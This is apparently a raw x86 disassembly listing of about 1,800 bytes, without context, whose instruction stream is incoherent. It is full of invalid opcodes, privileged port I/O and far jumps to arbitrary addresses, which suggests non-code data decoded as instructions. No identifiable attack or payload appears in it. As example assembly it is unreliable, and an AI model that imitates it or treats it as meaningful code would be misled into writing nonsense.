  40ed37:	dec    esp
  40ed38:	dec    BYTE PTR [ebx]
  40ed3a:	mov    ch,0x21
  40ed3c:	aas    
  40ed3d:	in     eax,0x73
  40ed3f:	and    edi,DWORD PTR [eax-0x1337e9c7]
  40ed45:	neg    BYTE PTR [eax]
  40ed47:	dec    ebp
  40ed48:	adc    al,0x42
  40ed4a:	aad    0x20
  40ed4c:	xor    eax,0xc2143130
  40ed51:	push   cs
  40ed52:	mul    DWORD PTR [edi+0x16]
  40ed55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed56:	cmp    al,bl
  40ed58:	out    dx,al
  40ed59:	lahf   
  40ed5a:	inc    ecx
  40ed5b:	cli    
  40ed5c:	imul   eax,DWORD PTR [ecx+0x24],0x50
  40ed60:	pusha  
  40ed61:	jno    0x40ed5c
  40ed63:	pop    eax
  40ed64:	pop    eax
  40ed65:	mov    al,0x75
  40ed67:	xchg   ebx,eax
  40ed68:	scas   al,BYTE PTR es:[edi]
  40ed69:	xor    DWORD PTR [esi],ecx
  40ed6b:	imul   eax,DWORD PTR [eax],0x29
  40ed6e:	cmp    eax,0xfc8ba55c
  40ed73:	sbb    edx,DWORD PTR [ebp-0x22]
  40ed76:	fistp  WORD PTR [ebx-0x625d6c9a]
  40ed7c:	pop    ecx
  40ed7d:	nop
  40ed7e:	or     al,BYTE PTR [edx+0x4fe13394]
  40ed84:	bound  edx,QWORD PTR [edi-0x54cc221e]
  40ed8a:	fs mov ebp,0x192e3125
  40ed90:	sbb    BYTE PTR [esp+ebp*1+0x625057a3],ah
  40ed97:	les    ebx,FWORD PTR [ebp-0x29]
  40ed9a:	mov    ds,WORD PTR [esp+esi*8-0x6bf9f858]
  40eda1:	push   0x22
  40eda3:	mov    bh,0xa0
  40eda5:	jne    0x40ede2
  40eda7:	loope  0x40edee
  40eda9:	mov    ebx,ebp
  40edab:	mov    ds:0x555d3bda,al
  40edb0:	adc    edx,DWORD PTR [edx+eax*1-0x35]
  40edb4:	ret    0xff7b
  40edb7:	into   
  40edb8:	dec    DWORD PTR [ebp+0x62149345]
  40edbe:	inc    edx
  40edbf:	test   BYTE PTR [ecx-0x61],ah
  40edc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edc3:	(bad)  
  40edc4:	mul    ah
  40edc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc7:	jnp    0x40ed82
  40edc9:	jb     0x40ee3a
  40edcb:	(bad)  
  40edcc:	aam    0xf9
  40edce:	data16 stos BYTE PTR es:[edi],al
  40edd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edd1:	push   ebp
  40edd2:	pop    eax
  40edd3:	pushf  
  40edd4:	scas   eax,DWORD PTR es:[edi]
  40edd5:	fadd   DWORD PTR [edx-0x28]
  40edd8:	iret   
  40edd9:	cs pushf 
  40eddb:	rcr    BYTE PTR [edi],1
  40eddd:	pop    ebp
  40edde:	rcl    DWORD PTR [ecx-0x47],cl
  40ede1:	xor    edi,DWORD PTR ds:0xdc032ae0
  40ede7:	popa   
  40ede8:	scas   eax,DWORD PTR es:[edi]
  40ede9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edea:	mov    bh,0xb7
  40edec:	(bad)
  40edef:	inc    edi
  40edf0:	out    dx,al
  40edf1:	fbld   TBYTE PTR [ebx]
  40edf3:	jae    0x40edd3
  40edf5:	sub    BYTE PTR [di],ah
  40edf8:	jecxz  0x40ee4e
  40edfa:	sub    al,0xe1
  40edfc:	test   esp,0xb07a359f
  40ee02:	mov    edx,0xd4943c30
  40ee07:	and    al,0x29
  40ee09:	retf   0xe5ff
  40ee0c:	(bad)  
  40ee0d:	(bad)  
  40ee0e:	xchg   edx,eax
  40ee0f:	mov    esi,0x54002932
  40ee14:	arpl   WORD PTR [ebx-0x2a],cx
  40ee17:	push   0x3c7d2410
  40ee1c:	or     ecx,DWORD PTR [edi+0x39]
  40ee1f:	mov    bl,0x95
  40ee21:	repz (bad) 
  40ee23:	cli    
  40ee24:	and    esp,DWORD PTR [ebp-0x7d427725]
  40ee2a:	jns    0x40ee51
  40ee2c:	or     dh,bl
  40ee2e:	sub    al,BYTE PTR [eax-0x6e]
  40ee31:	jo     0x40ee71
  40ee33:	jb     0x40ee8e
  40ee35:	pop    edx
  40ee36:	push   edx
  40ee37:	cmp    al,0x84
  40ee39:	outs   dx,BYTE PTR ds:[esi]
  40ee3a:	mov    ds:0xdf467fe1,al
  40ee3f:	jnp    0x40ee80
  40ee41:	mov    dl,0x53
  40ee43:	push   ebp
  40ee44:	scas   eax,DWORD PTR es:[edi]
  40ee45:	pusha  
  40ee46:	mov    esp,0xce58026c
  40ee4b:	adc    eax,0x94d098b0
  40ee50:	out    dx,al
  40ee51:	loope  0x40eec9
  40ee53:	and    DWORD PTR [ebx],edx
  40ee55:	push   cs
  40ee56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee57:	push   esi
  40ee58:	sbb    esp,DWORD PTR [ecx-0x70]
  40ee5b:	and    BYTE PTR [edx],bl
  40ee5d:	(bad)  [ecx-0x60]
  40ee60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee61:	or     al,0x2
  40ee63:	sti    
  40ee64:	mov    ch,BYTE PTR [ecx]
  40ee66:	xchg   ecx,eax
  40ee67:	or     eax,0x55b9a18d
  40ee6c:	push   es
  40ee6d:	mov    al,ds:0xcce8e08f
  40ee72:	mov    ecx,DWORD PTR [edi]
  40ee74:	pop    eax
  40ee75:	inc    BYTE PTR [esi-0x36]
  40ee78:	cdq    
  40ee79:	jmp    0x713f:0xc8ea4353
  40ee80:	mov    ecx,0xc4249118
  40ee85:	cmp    eax,0x91cc4b8a
  40ee8a:	and    al,0x1
  40ee8c:	adc    BYTE PTR [ebx-0x3b5714ef],0x24
  40ee93:	out    dx,eax
  40ee94:	ins    DWORD PTR es:[edi],dx
  40ee95:	aas    
  40ee96:	adc    al,BYTE PTR [edi+edi*1+0x446bbc8b]
  40ee9d:	mov    ah,bl
  40ee9f:	cmp    ch,bl
  40eea1:	data16 es mov dh,0xc6
  40eea5:	mov    dl,0xf6
  40eea7:	fdivr  st,st(1)
  40eea9:	jecxz  0x40ee4f
  40eeab:	fsubr  st(6),st
  40eead:	sub    al,0x9b
  40eeb0:	sbb    BYTE PTR [ecx-0x36472067],ch
  40eeb6:	jo     0x40ee4a
  40eeb8:	xchg   BYTE PTR [ecx],cl
  40eeba:	shr    BYTE PTR [ecx+0x30eef628],cl
  40eec0:	inc    esi
  40eec1:	add    eax,edi
  40eec3:	rcr    DWORD PTR [ebx-0x2a],0x85
  40eec7:	(bad)  
  40eec8:	push   edx
  40eec9:	jl     0x40eeed
  40eecb:	or     BYTE PTR [ecx+0x19],bh
  40eece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eecf:	in     al,0x14
  40eed1:	or     eax,0x7d3f9bb0
  40eed6:	adc    dh,BYTE PTR [ebp-0x34c57b9d]
  40eedc:	adc    DWORD PTR [ebp+edx*4+0x6f],eax
  40eee0:	ins    BYTE PTR es:[edi],dx
  40eee1:	push   ds
  40eee2:	nop    DWORD PTR [ebp+0x555c2162]
  40eee9:	xchg   ebx,edx
  40eeeb:	jl     0x40ee92
  40eeed:	dec    ecx
  40eeee:	mov    cl,0xa5
  40eef0:	lds    ecx,FWORD PTR [ebp-0x50dc4366]
  40eef6:	lds    edi,FWORD PTR ds:0xb4edf14
  40eefc:	loop   0x40ef35
  40eefe:	mov    BYTE PTR ds:0x58b3e19c,ah
  40ef04:	or     edi,edx
  40ef06:	adc    cl,ah
  40ef08:	xor    dh,BYTE PTR [ecx-0x77]
  40ef0b:	push   ss
  40ef0c:	xchg   DWORD PTR [eax],edi
  40ef0e:	xchg   ecx,eax
  40ef0f:	inc    ecx
  40ef10:	jge    0x40ef46
  40ef12:	mov    dl,0x6d
  40ef14:	jnp    0x40ef3e
  40ef16:	mov    bh,0xba
  40ef18:	test   DWORD PTR [eax+edx*4-0x51d73b35],esp
  40ef1f:	push   ss
  40ef20:	ret    
  40ef21:	sub    al,ch
  40ef23:	enter  0x4dae,0xfe
  40ef27:	inc    esi
  40ef28:	popa   
  40ef29:	push   esp
  40ef2a:	shl    DWORD PTR [edi-0x105637ea],cl
  40ef30:	out    dx,eax
  40ef31:	pop    ebp
  40ef32:	test   DWORD PTR [ecx-0x16ed3481],edx
  40ef38:	je     0x40efb9
  40ef3a:	sbb    DWORD PTR ds:0xfdbbb86d,ebp
  40ef40:	(bad)  
  40ef42:	fiadd  DWORD PTR [edi-0x10]
  40ef45:	add    al,0xf5
  40ef47:	stc    
  40ef48:	out    dx,eax
  40ef49:	int    0x51
  40ef4b:	js     0x40eeed
  40ef4d:	pop    esp
  40ef4e:	sahf   
  40ef4f:	inc    esi
  40ef50:	mov    ebx,ss
  40ef52:	or     DWORD PTR [edi],ebp
  40ef54:	sbb    ecx,DWORD PTR [ecx+0x3fad6abf]
  40ef5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef5b:	xor    eax,0x8d833319
  40ef60:	test   eax,0x55c64be1
  40ef65:	jae    0x40eef3
  40ef67:	dec    esi
  40ef68:	mov    DWORD PTR [esi+0x2d751e1a],edi
  40ef6e:	cmp    edi,edi
  40ef70:	mov    dh,0xa6
  40ef72:	add    eax,eax
  40ef74:	add    al,0xc6
  40ef76:	fnstenv [edx-0x32]
  40ef79:	and    eax,0xc154197e
  40ef7e:	ret    
  40ef7f:	fst    DWORD PTR [edi-0x62]
  40ef82:	outs   dx,BYTE PTR ds:[esi]
  40ef83:	fiadd  WORD PTR [edx+esi*1-0x33]
  40ef87:	inc    eax
  40ef88:	jno    0x40ef8c
  40ef8a:	push   cs
  40ef8b:	xchg   ebp,eax
  40ef8c:	dec    ecx
  40ef8d:	retf   
  40ef8e:	aaa    
  40ef8f:	cmp    al,BYTE PTR [esp+ebx*1]
  40ef92:	mov    DWORD PTR [eax-0x6001e635],esi
  40ef98:	push   ss
  40ef99:	jno    0x40ef99
  40ef9b:	(bad)  
  40ef9c:	hlt    
  40ef9d:	sub    ch,ch
  40ef9f:	outs   dx,BYTE PTR ds:[esi]
  40efa0:	xor    BYTE PTR [edi+edi*2-0x4d0441fd],ah
  40efa7:	dec    ecx
  40efa8:	mov    edi,0x4fd9620b
  40efad:	call   0x9706249d
  40efb2:	call   0xe36:0x92be05d9
  40efb9:	(bad)  
  40efba:	sub    dl,BYTE PTR [ecx+0x7b]
  40efbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efbe:	pop    ds
  40efbf:	js     0x40efb9
  40efc1:	into   
  40efc2:	data16 sbb bh,BYTE PTR [eax+ecx*2-0x36]
  40efc7:	lods   al,BYTE PTR ds:[esi]
  40efc8:	nop
  40efc9:	sbb    al,0xb
  40efcb:	ficom  DWORD PTR [ebx+0x2cca389c]
  40efd1:	dec    esp
  40efd2:	xchg   ebp,eax
  40efd3:	fisttp WORD PTR [edi+0xd]
  40efd6:	add    al,0x6b
  40efd8:	sbb    al,0x4b
  40efda:	cmc    
  40efdb:	call   0x4132:0x78cc3826
  40efe2:	jae    0x40ef65
  40efe4:	repz push ss
  40efe6:	(bad)  
  40efe7:	mov    edx,0x2abfcaca
  40efec:	jl     0x40f003
  40efee:	pop    esi
  40efef:	stos   BYTE PTR es:[edi],al
  40eff0:	push   edx
  40eff1:	jae    0x40f032
  40eff3:	mov    ss,WORD PTR [eax+0x7a7cbc2f]
  40eff9:	int3   
  40effa:	dec    eax
  40effb:	mov    eax,ds:0xb0f9dde7
  40f000:	jmp    0x40f04a
  40f002:	std    
  40f003:	inc    DWORD PTR ds:0x92c25993
  40f009:	sub    eax,DWORD PTR [ebx-0xd38a549]
  40f00f:	jbe    0x40f04f
  40f011:	pop    esi
  40f012:	bound  eax,QWORD PTR [ebp+0x5847e603]
  40f018:	or     BYTE PTR [edx-0x58940b32],bl
  40f01e:	shr    edx,cl
  40f020:	cmp    ah,BYTE PTR [edx+0x2c]
  40f023:	retf   0xf4ce
  40f026:	dec    eax
  40f027:	cmp    ecx,DWORD PTR [edi-0xd]
  40f02a:	das    
  40f02b:	inc    esi
  40f02c:	out    dx,eax
  40f02d:	aam    0x6d
  40f02f:	mov    esi,0xd65964c8
  40f034:	mov    eax,0x2c08d9cb
  40f039:	cmp    BYTE PTR ds:0x1cdaade1,dh
  40f03f:	stc    
  40f040:	sub    DWORD PTR [eax],esp
  40f042:	xchg   BYTE PTR [ebp+ecx*2+0x3c],bl
  40f046:	mov    eax,0x56666015
  40f04b:	(bad)  
  40f04c:	sub    DWORD PTR [edx+0x12],esi
  40f04f:	jbe    0x40f0c5
  40f051:	mov    esp,0x66629416
  40f056:	je     0x40efee
  40f058:	repnz (bad) 
  40f05a:	mov    ecx,ss
  40f05c:	adc    eax,0x80755e6b
  40f061:	mov    DWORD PTR [edi-0x47],edi
  40f064:	push   0xffffff90
  40f066:	push   esp
  40f067:	retf   
  40f068:	leave  
  40f069:	fisub  DWORD PTR [ebp-0x31]
  40f06c:	mov    ch,bh
  40f06e:	gs mov esi,0xadc26f18
  40f074:	adc    eax,0x140d7229
  40f079:	test   eax,0xc49b2bbf
  40f07e:	cli    
  40f07f:	add    al,0x52
  40f081:	mov    bl,0xbe
  40f083:	inc    ecx
  40f084:	mov    bl,0x33
  40f086:	inc    esp
  40f087:	fucomi st,st(6)
  40f089:	sbb    al,dl
  40f08b:	sub    BYTE PTR [ecx+0x69],bl
  40f08e:	test   BYTE PTR [esp+esi*2-0x19],al
  40f092:	test   BYTE PTR [esi],0xa0
  40f095:	xchg   edi,eax
  40f096:	ja     0x40f101
  40f098:	(bad)  
  40f099:	fsubr  DWORD PTR [edi-0x7b3aa6b7]
  40f09f:	xor    eax,0xd2cdb261
  40f0a4:	mov    dh,0x94
  40f0a6:	std    
  40f0a7:	cmp    DWORD PTR [ebx-0x79],esp
  40f0aa:	add    bh,BYTE PTR [edx-0x5f2c1dbe]
  40f0b0:	fdivr  DWORD PTR [ebx+esi*2-0x39]
  40f0b4:	cmp    dh,al
  40f0b6:	mov    ah,0xc2
  40f0b8:	or     BYTE PTR [ebx+edx*4+0x6a545e11],bl
  40f0bf:	sub    ecx,DWORD PTR [esi+0xc9c6e4]
  40f0c5:	cmp    bl,al
  40f0c7:	icebp  
  40f0c8:	push   edi
  40f0c9:	mov    ch,0x53
  40f0cb:	call   0x41f3:0x6af7224
  40f0d2:	xlat   BYTE PTR ds:[ebx]
  40f0d3:	ror    BYTE PTR [esi+0x2e],cl
  40f0d6:	jmp    0xf5fa:0x4780b03e
  40f0dd:	repnz rcl BYTE PTR [edx],0x2c
  40f0e1:	jmp    0xdf90ac13
  40f0e6:	dec    edx
  40f0e7:	pop    es
  40f0e8:	jne    0x40f09a
  40f0ea:	aad    0x28
  40f0ec:	test   BYTE PTR [edx+0x4fc082d6],al
  40f0f2:	inc    esi
  40f0f3:	sub    ecx,DWORD PTR [ebp+0x26]
  40f0f6:	mov    ebx,0x600d9115
  40f0fb:	stos   BYTE PTR es:[edi],al
  40f0fc:	cdq    
  40f0fd:	pop    ecx
  40f0fe:	add    BYTE PTR [esi+0x68],al
  40f101:	gs push ds
  40f103:	call   0x75d8:0xa757ba10
  40f10a:	dec    edi
  40f10b:	gs or  ah,ah
  40f10e:	xor    BYTE PTR [edx-0x368ca7dc],al
  40f114:	adc    ebp,DWORD PTR ss:[ebp-0x14]
  40f118:	mov    BYTE PTR [ecx+0x2a],0xc0
  40f11c:	push   ss
  40f11d:	push   0xc80fa86
  40f122:	xchg   esi,eax
  40f123:	mov    al,ds:0x1cfe1e41
  40f128:	mov    bh,0xef
  40f12a:	inc    ebp
  40f12b:	cmovl  ebp,DWORD PTR [esi-0x22bdf217]
  40f132:	and    dh,BYTE PTR [eax]
  40f134:	and    al,0x54
  40f136:	in     al,0x65
  40f138:	ins    DWORD PTR es:[edi],dx
  40f139:	mov    edi,0x6dd4fb00
  40f13e:	mov    edx,0x560d3997
  40f143:	or     al,0x23
  40f145:	int    0x8f
  40f147:	clc    
  40f148:	pop    ds
  40f149:	xor    esp,ebp
  40f14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f14c:	int3   
  40f14d:	or     DWORD PTR ds:0xd5ee61f1,eax
  40f153:	and    al,0xab
  40f155:	out    dx,eax
  40f156:	ss dec esi
  40f158:	mov    ecx,0x64a4dff6
  40f15d:	jl     0x40f187
  40f15f:	push   ebp
  40f160:	xor    BYTE PTR [esi],bl
  40f162:	popf   
  40f163:	fld    TBYTE PTR [ecx+0x23eb02b9]
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	cmc    
  40f16b:	nop
  40f16c:	cli    
  40f16d:	xor    bl,cl
  40f16f:	mov    cl,ch
  40f171:	jo     0x40f14c
  40f173:	adc    eax,0x2e3f3e51
  40f178:	sti    
  40f179:	out    0x73,al
  40f17b:	lahf   
  40f17c:	aam    0x68
  40f17e:	daa    
  40f17f:	into   
  40f180:	add    eax,0x1ba040c0
  40f185:	push   edi
  40f186:	mov    ah,0xee
  40f188:	add    BYTE PTR [eax-0x63c7e25d],cl
  40f18e:	inc    ebp
  40f18f:	cmp    al,0xe0
  40f191:	mov    edx,0xa6c9870b
  40f196:	into   
  40f197:	lahf   
  40f198:	mov    edi,0x56b56599
  40f19d:	push   ds
  40f19e:	mov    WORD PTR [edx],?
  40f1a0:	mov    eax,ds:0x3b7e67e3
  40f1a5:	div    DWORD PTR [ebp-0x6d]
  40f1a8:	jl     0x40f216
  40f1aa:	mov    edi,0x50a1ec0
  40f1af:	sar    BYTE PTR gs:[ebx],0x96
  40f1b3:	xchg   edi,eax
  40f1b4:	mov    dl,0x9d
  40f1b6:	imul   ecx
  40f1b8:	mov    esp,0x9953ff48
  40f1bd:	test   eax,0x57b66c42
  40f1c2:	popa   
  40f1c3:	adc    al,0x68
  40f1c5:	jb     0x40f14b
  40f1c7:	mov    ebp,0x1829b60e
  40f1cc:	mov    dh,0xf0
  40f1ce:	jmp    0xb674:0x8343
  40f1d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1d5:	shr    cl,1
  40f1d7:	repz repz rcl BYTE PTR [ebx],cl
  40f1db:	shl    edi,0x7a
  40f1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1df:	pop    eax
  40f1e0:	mov    ds:0xebd3402f,al
  40f1e5:	repnz dec ebp
  40f1e7:	push   cs
  40f1e8:	int    0x33
  40f1ea:	mov    cl,0xd0
  40f1ec:	mov    dl,ah
  40f1ee:	fbstp  TBYTE PTR [ebp-0x6a863228]
  40f1f4:	test   DWORD PTR [edx],ebx
  40f1f6:	in     al,0x73
  40f1f8:	cmp    esp,DWORD PTR [edx-0x7fd3b418]
  40f1fe:	xchg   edx,eax
  40f1ff:	jns    0x40f1ce
  40f201:	sub    eax,0x7c345f4c
  40f206:	dec    eax
  40f207:	or     DWORD PTR [ebp+0x27e4dc26],ecx
  40f20d:	sbb    eax,0x312b5ab1
  40f212:	pop    esi
  40f213:	aam    0x3d
  40f215:	sbb    DWORD PTR [edx+eax*4+0x1f],ebx
  40f219:	rol    al,1
  40f21b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f21c:	dec    esi
  40f21d:	ins    BYTE PTR es:[edi],dx
  40f21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f21f:	cmp    ah,ah
  40f221:	loop   0x40f296
  40f223:	pushf  
  40f224:	imul   ecx,DWORD PTR [ecx-0x3f29afcd],0xcc89a31e
  40f22e:	jnp    0x40f242
  40f230:	outs   dx,BYTE PTR ds:[esi]
  40f231:	inc    edx
  40f232:	call   0xaabb:0xd2234760
  40f239:	mov    esi,DWORD PTR [ebx-0x1fdc052d]
  40f23f:	xor    edi,DWORD PTR [edx]
  40f241:	mov    ecx,0xc778d8b8
  40f246:	pusha  
  40f247:	fld    DWORD PTR [ebx]
  40f249:	add    eax,0xdbe16c99
  40f24e:	jo     0x40f22a
  40f250:	es or  al,0x4d
  40f253:	(bad)  
  40f254:	or     cl,bh
  40f256:	ins    BYTE PTR es:[edi],dx
  40f257:	sbb    DWORD PTR [esi-0x2882144a],ecx
  40f25d:	push   ecx
  40f25e:	or     BYTE PTR [ecx-0x2b49042e],ch
  40f264:	push   ds
  40f265:	scas   al,BYTE PTR es:[edi]
  40f266:	mov    ah,0xd1
  40f268:	mov    DWORD PTR ds:0xd958707c,ecx
  40f26e:	push   edi
  40f26f:	jno    0x40f2af
  40f271:	pop    edx
  40f272:	ins    DWORD PTR es:[edi],dx
  40f273:	or     eax,0x33ec7f31
  40f278:	int    0x6a
  40f27a:	pop    ss
  40f27b:	xor    dl,BYTE PTR [edi]
  40f27d:	sbb    esi,DWORD PTR [eax-0x20d02ae3]
  40f283:	sub    BYTE PTR [edx-0x15f41fdc],0xb7
  40f28a:	mov    ecx,0x3af78eba
  40f28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f290:	pushf  
  40f291:	sub    BYTE PTR [eax],ch
  40f293:	push   0xffffff92
  40f295:	sbb    al,0xba
  40f297:	lahf   
  40f298:	arpl   WORD PTR [ebx-0x3aafaf0b],dx
  40f29e:	les    ebx,FWORD PTR [edi+0x74f6339d]
  40f2a4:	ins    BYTE PTR es:[edi],dx
  40f2a5:	mov    WORD PTR [bp+di+0x2f9f],fs
  40f2aa:	out    0x13,al
  40f2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2ad:	mov    bh,0xe7
  40f2af:	xor    BYTE PTR [ecx-0x13cc4232],0x9a
  40f2b6:	mov    eax,ds:0x1a19b796
  40f2bb:	sbb    DWORD PTR [edx],ebp
  40f2bd:	xchg   ebx,eax
  40f2be:	ins    BYTE PTR es:[edi],dx
  40f2bf:	jecxz  0x40f2d8
  40f2c1:	inc    ebp
  40f2c2:	adc    eax,0xabfeca8b
  40f2c7:	leave  
  40f2c8:	jl     0x40f31c
  40f2ca:	sub    al,0xa7
  40f2cc:	dec    esi
  40f2cd:	stc    
  40f2ce:	sbb    cl,0x32
  40f2d1:	pop    eax
  40f2d2:	repz repz jns 0x40f2b1
  40f2d6:	popa   
  40f2d7:	outs   dx,BYTE PTR ds:[esi]
  40f2d8:	dec    esi
  40f2d9:	jle    0x40f2ea
  40f2db:	cmp    BYTE PTR [esi-0x2a4e8782],bh
  40f2e1:	inc    esi
  40f2e2:	push   ds
  40f2e3:	inc    esp
  40f2e4:	xor    eax,0x1daa92e6
  40f2e9:	xor    ah,BYTE PTR [edi-0x52]
  40f2ec:	xchg   esp,eax
  40f2ed:	push   esi
  40f2ee:	into   
  40f2ef:	mov    ds:0xcbc30c46,eax
  40f2f4:	mov    ds:0x5374a39f,eax
  40f2f9:	cmp    al,0xca
  40f2fb:	icebp  
  40f2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2fd:	dec    ebx
  40f2fe:	out    dx,al
  40f2ff:	js     0x40f326
  40f301:	std    
  40f302:	imul   ecx,DWORD PTR cs:0x46267bd6,0xffffff89
  40f30a:	sbb    eax,0x302e2f23
  40f30f:	adc    dl,bl
  40f311:	popa   
  40f312:	xchg   edi,eax
  40f313:	add    dh,dl
  40f315:	push   0xffffffcd
  40f317:	lahf   
  40f318:	sub    eax,0x22259331
  40f31d:	xor    ecx,edx
  40f31f:	or     eax,0x4b733ba0
  40f324:	popa   
  40f325:	xor    eax,0xc9cb6a3f
  40f32a:	je     0x40f2bd
  40f32c:	or     ebx,eax
  40f32e:	mov    ch,0xcc
  40f330:	push   ecx
  40f331:	mov    bh,BYTE PTR [edi+0xb46bb22]
  40f337:	aaa    
  40f338:	(bad)  
  40f339:	mov    ds:0xd2a53485,al
  40f33e:	aad    0xb8
  40f340:	lahf   
  40f341:	ror    bh,1
  40f343:	mov    ch,0x36
  40f345:	nop
  40f346:	fst    st(3)
  40f348:	xor    ebp,ebx
  40f34a:	xchg   ecx,eax
  40f34b:	jmp    0x40f33a
  40f34d:	cmp    ebp,edi
  40f34f:	fiadd  DWORD PTR [esi+0x5c]
  40f352:	add    al,0xd9
  40f354:	lods   al,BYTE PTR ds:[esi]
  40f355:	out    0x18,al
  40f357:	daa    
  40f358:	outs   dx,BYTE PTR ds:[esi]
  40f359:	stos   BYTE PTR es:[edi],al
  40f35a:	add    esp,edx
  40f35c:	sbb    esi,DWORD PTR [edi-0x72dc89b0]
  40f362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f363:	test   BYTE PTR [ebx-0x2f26f506],ah
  40f369:	push   ds
  40f36a:	mov    esp,0x578d6400
  40f36f:	retf   0x3b28
  40f372:	lahf   
  40f373:	jb     0x40f30d
  40f375:	inc    edx
  40f376:	(bad)  
  40f378:	jmp    0x40f3a7
  40f37a:	and    al,0xc2
  40f37c:	not    BYTE PTR [edx+0x58de99c2]
  40f382:	adc    BYTE PTR [ecx-0x6d],bl
  40f385:	jmp    0xa6d7:0xc7188a8f
  40f38c:	cwde   
  40f38d:	gs ins DWORD PTR es:[edi],dx
  40f38f:	sti    
  40f390:	mov    ebp,0xd5d2fba7
  40f395:	mov    cs,ecx
  40f397:	call   0xec71:0x3bd412a5
  40f39e:	out    0xf5,eax
  40f3a0:	inc    edx
  40f3a1:	push   edx
  40f3a2:	das    
  40f3a3:	pop    edi
  40f3a4:	sub    bl,ah
  40f3a6:	and    DWORD PTR [eax-0x8],0x15
  40f3aa:	stos   BYTE PTR es:[edi],al
  40f3ab:	push   esi
  40f3ac:	test   al,0x3d
  40f3ae:	push   esp
  40f3af:	(bad)  
  40f3b0:	jecxz  0x40f3a7
  40f3b2:	mov    cs,WORD PTR [esi]
  40f3b4:	xchg   ebx,eax
  40f3b5:	fiadd  WORD PTR [eax]
  40f3b7:	mov    ecx,0xa81ea0db
  40f3bc:	mov    ds:0x31306aee,al
  40f3c1:	push   edi
  40f3c3:	out    dx,eax
  40f3c4:	fdiv   DWORD PTR [ecx]
  40f3c6:	adc    ch,BYTE PTR [edi+0x65114f89]
  40f3cc:	jb     0x40f395
  40f3ce:	mov    BYTE PTR [ebx],cl
  40f3d0:	sbb    esi,DWORD PTR [eax+ecx*8+0x63]
  40f3d4:	xor    bh,BYTE PTR [edx-0x5ff5e483]
  40f3da:	loopne 0x40f455
  40f3dc:	lea    ebx,[ecx]
  40f3de:	fst    QWORD PTR [ebx-0xa]
  40f3e2:	js     0x40f3dc
  40f3e4:	frstor [esi]
  40f3e6:	mov    ds:0xcc878bfe,eax
  40f3eb:	jmp    0xe612:0x8c9b3c2c
  40f3f2:	out    dx,eax
  40f3f3:	mov    dh,0x4e
  40f3f5:	pushf  
  40f3f6:	in     al,0x5c
  40f3f8:	mov    WORD PTR [eax+0x30e882b1],fs
  40f3fe:	xchg   esi,eax
  40f3ff:	ja     0x40f429
  40f401:	into   
  40f402:	mov    ds:0x8fe894de,eax
  40f407:	ss push ebx
  40f409:	outs   dx,BYTE PTR ds:[esi]
  40f40a:	test   DWORD PTR [ecx-0x200ee51a],edi
  40f410:	push   ecx
  40f411:	xchg   esi,eax
  40f412:	js     0x40f422
  40f414:	fild   QWORD PTR [edx+0x1807ec93]
  40f41a:	dec    edi
  40f41b:	rcr    ebp,cl
  40f41d:	(bad)  
  40f41e:	mov    ebx,0x97fd22f2
  40f423:	(bad)  
  40f425:	xchg   esp,eax
  40f426:	jns    0x40f3e5
  40f428:	adc    ah,BYTE PTR [edi-0x1ba98a03]
  40f42e:	out    dx,eax
  40f42f:	lea    esi,[edi]
  40f431:	data16 (bad) 
  40f433:	imul   ebp,DWORD PTR [ebp+0x2d0a287f],0x7b55e178
  40f43d:	leave  
  40f43e:	out    dx,al
  40f43f:	adc    eax,0x825a64f5
  40f444:	xor    DWORD PTR [eax],ecx
  40f446:	aam    0xb4
  40f448:	push   0x9d733bf9
  40f44d:	xor    bl,BYTE PTR [eax+0x31]
  40f450:	jle    0x40f3da
  40f452:	sub    ecx,DWORD PTR [esi+0x5c6f73a4]
  40f458:	jmp    0xfcf88070
  40f45d:	out    dx,eax
  40f45e:	cdq    
  40f45f:	inc    esp
  40f460:	jecxz  0x40f44d
  40f462:	jg     0x40f4ce
  40f464:	add    eax,DWORD PTR [esi]
  40f466:	or     al,0x5a
  40f468:	and    BYTE PTR [eax-0x73],bh
  40f46b:	sub    BYTE PTR [edi+0x5d47150a],ch
  40f471:	mov    eax,0xe152b88b
  40f476:	or     eax,0x8946f297
  40f47b:	out    0x94,al
  40f47d:	push   esi
  40f47e:	or     dl,BYTE PTR [eax]
  40f480:	mov    fs,eax
  40f482:	imul   ebx,ebx,0x3a
  40f485:	test   BYTE PTR [ebx-0x5dc80aa8],0x76
  40f48c:	jl     0x40f486
  40f48e:	cwde   
  40f48f:	out    dx,al
  40f490:	pop    es
  40f491:	(bad)  
  40f492:	sub    al,0xaf
  40f494:	sub    al,0x2
  40f496:	push   ebx
  40f497:	repnz add al,0x34
  40f49a:	mov    dl,0xcc
  40f49c:	mov    edi,0xf8eb79ec
  40f4a1:	jo     0x40f4f2
  40f4a3:	and    al,0x7b
  40f4a5:	call   0x366:0x90e3cecf
  40f4ac:	mov    esp,0x30c76c89
  40f4b1:	dec    edi
  40f4b2:	cmp    DWORD PTR [edx+0x504c7f59],0xb41c7e1d
  40f4bc:	ja     0x40f4e9
  40f4be:	(bad)  
  40f4bf:	lods   eax,DWORD PTR ds:[esi]
  40f4c0:	push   ebp
  40f4c1:	in     al,0x6c
  40f4c3:	test   ah,dh
  40f4c5:	pop    es
  40f4c6:	push   esi
  40f4c7:	mov    esp,0xb3b5c22c
